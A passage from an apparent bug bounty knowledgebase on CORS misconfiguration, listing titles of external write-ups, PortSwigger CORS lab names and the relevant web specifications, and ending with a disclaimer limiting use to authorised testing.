- bughunterboy — Cross-origin resource sharing misconfig | steal user information
- Geekboy — Exploiting Misconfigured CORS
- Ayoub Safa — Think Outside the Scope: Advanced CORS Exploitation Techniques
- Corben Leo — Advanced CORS Exploitation Techniques
- Vadim (jarvis7) — Cross-origin resource sharing misconfiguration (CORS)
- Detectify Blog — CORS Misconfigurations Explained

### Labs & Training

- PortSwigger CORS Labs:
  - CORS vulnerability with basic origin reflection
  - CORS vulnerability with trusted null origin
  - CORS vulnerability with trusted insecure protocols
  - CORS vulnerability with internal network pivot attack
  - CORS vulnerability with preflight request bypass
  - CORS vulnerability with private network XSS

### Specifications

- W3C CORS Specification
- RFC 6454 — The Web Origin Concept
- Fetch Standard (WHATWG)

---

> **Disclaimer:** This knowledgebase is for authorized security testing and bug bounty hunting only. Always obtain proper authorization before testing systems you do not own.
